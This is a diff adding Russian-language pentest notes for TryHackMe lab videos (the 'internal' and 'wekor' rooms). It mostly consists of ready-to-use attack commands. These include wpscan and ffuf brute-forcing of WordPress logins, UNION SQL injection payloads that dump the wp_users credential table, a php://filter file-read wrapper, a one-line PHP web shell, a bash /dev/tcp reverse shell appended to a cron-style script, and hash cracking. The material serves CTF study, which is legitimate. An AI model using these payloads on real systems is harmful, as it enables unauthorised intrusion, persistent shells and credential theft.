@@ -92,9 +92,9 @@ https://github.com/getflow/CTF/tree/main/AtomSkills2023
 * https://crackstation.net/
 
 🔼 Апгрейд шела
-** export TERM=screen
+* export TERM=screen
 ⌨️ Апгрейд шелла
-** $ python3 -c 'import pty;pty.spawn("/bin/bash")'
+* $ python3 -c 'import pty;pty.spawn("/bin/bash")'
 export TERM=screen
 
 ⌨️ Rustscan
@@ -169,7 +169,93 @@ $ john id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt
 $ ssh -i id_rsa user@ip_address
 ```
 
+Софт и команды из видео
 
+🖥 Большой выбор бесплатных машин
+https://tryhackme.com/
+
+🖥 Машина из видео
+https://tryhackme.com/room/internal
+
+🔎 Nmap под разные ОС
+https://nmap.org/download.html
+
+🗂 Перебор директорий - dirsearch
+https://github.com/maurosoria/dirsearch
+
+☠️ pwncat
+https://github.com/calebstewart/pwncat
+
+⌨️ Rustscan
+```
+$ rustscan -a ipaddr
+```
+⌨️ Dirsearch
+```
+$ dirsearch -e php,log,sql,txt,bak,tar,tar.gz,zip,rar,swp,gz,asp,aspx -u 'ipaddr'
+```
+⌨️ wpscan
+```
+$ wpscan -e u,ap,t --url internal.thm/blog
+```
+⌨️ wpscan
+```
+$ wpscan --url internal.thm/blog/wp-login.php --usernames admin --passwords /usr/share/wordlists/rockyou.txt --max-threads 50
+```
+⌨️ ffuf
+```
+$ ffuf -u "http://internal.thm/blog/wp-login.php/" -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "log=admin&pwd=WFUZZ" -w /usr/share/wordlists/rockyou.txt:WFUZZ -c -t 100 -mc all -fs 4942
+```
+
+ Команды из видео
+
+SQL injection:
+```
+'union select null, null-- -
+'union select null, null, database()-- -
+'union select null,null, table_schema from information_schema.tables-- -
+'union select null,null,table_name from information_schema.tables where table_schema='wordpress'-- -
+'union select null,null,group_concat(column_name) from information_schema.columns where table_name='wp_users'-- -
+'union select null,null,group_concat(user_login,user_pass) from wordpress.wp_users-- -
+```
+Перебор субдоменов:
+```
+ffuf -u "http://wekor.thm" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.wekor.thm" -fs 23
+```
+Перебор директорий:
+```
+ffuf -u "http://site.wekor.thm/FUZZ" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+```
+
+
+⌨️ php wrapper
+```
+php://filter/convert.base64-encode/resource=index
+```
+⌨️ php shell
+```
+<?php system($_GET['cmd'])?>
+```
+⌨️ sh reverse shell
+```
+echo "/bin/bash -c 'bash -i >& /dev/tcp/ip/port 0>&1'" >> backup.sh
+```
+
+⌨️ Dirsearch
+```
+$ dirsearch -e php,log,sql,txt,bak,tar,tar.gz,zip,rar,swp,gz,asp,aspx -u 'ipaddr'
+⌨️ wpscan
+```
+$ wpscan -e u,ap,t --url internal.thm/blog
+```
+⌨️ nth
+```
+$ nth --text 'your_hash'
+```
+⌨️ hashcat
+```
+$ hashcat -a 0 -m 3200 hash /wordlists/rockyou.txt
+```
 
 
 
